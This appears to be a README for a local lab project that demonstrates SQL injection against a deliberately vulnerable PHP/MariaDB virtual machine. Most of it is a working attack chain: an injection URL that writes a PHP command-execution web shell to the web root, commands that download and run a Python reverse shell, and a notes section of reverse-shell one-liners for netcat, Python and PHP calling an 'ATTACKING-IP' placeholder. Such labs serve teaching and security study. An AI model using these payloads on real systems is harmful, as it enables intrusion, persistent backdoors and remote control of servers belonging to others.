SQL INJECTION ATTACK EXAMPLE
============================

This is a small project to show how easy it can be to exploit SQL injection and how dangerous it can be.

Setup Instructions
----------------------------

In order to setup locally, you will need Virtualbox, Vagrant and Ansible installed on your work machine.

```
// Clone the repository to your work machine.
# git clone git@github.com:doublehops/sql-injection-attack-example.git

// Change into the new directory download and run the virtual machine with:
# vagrant up

// Ensure you can ssh into the virtual machine:
# ssh vagrant@192.168.30.99 -i .vagrant/machines/default/virtualbox/private_key

// Use Ansible to provision (install the webserver, PHP, MariaDB/MYSQL) the box with the following:
# dev/provision.sh local_dev

// Import database schema and data into database:
# dev/ssh-import-database.sh

// Load the webpage in your browser to check all is well: http://192.168.30.99
```

Play Around with SQL Injection
------------------------------

I have added an example of how to exploit an SQL Injection vulnerability by changing the passwords of all users in the user table.
<a href="sql-injection-playground.php">SQL Injection Playground</a>. You need to reload the page to see the results as the select query is executed before the update request.


Gain Shell Access to Webserver with the Help of SQL Injection
-------------------------------------------

Inject SQL that will create a PHP script that will run passed commads:
http://192.168.30.99/login.php?username=d%27;select%20%22%3C?php%20system($_GET[%27cmd%27]);%22%20into%20outfile%20%22/var/www/web/images/system.php%22;  

__PYTHON BACKDOOR__

Download Python reverse shell  
http://192.168.30.99/images/system.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py

Setup the waiting prompt on your host machine - Netcat must be installed:  
`nc -nlvp 4444`

Run new Python reverse shell.  
http://192.168.30.99/images/system.php?cmd=/tmp/reverse-shell.py

The terminal on the host machine waiting for connection should be connected now. Try typing `ls -l /var/www/web` to see the files listed.



NOTES
----------

Setup host machine for incoming connections:  
`nc -nvlp 4444`

__Run reverse shell command on foreign machine:__

Netcat reverse shell:  
`nc.traditional -e /bin/sh <host> 4444`

Python reverse shell:  
```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'```

PHP reverse shell:  
`php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'`
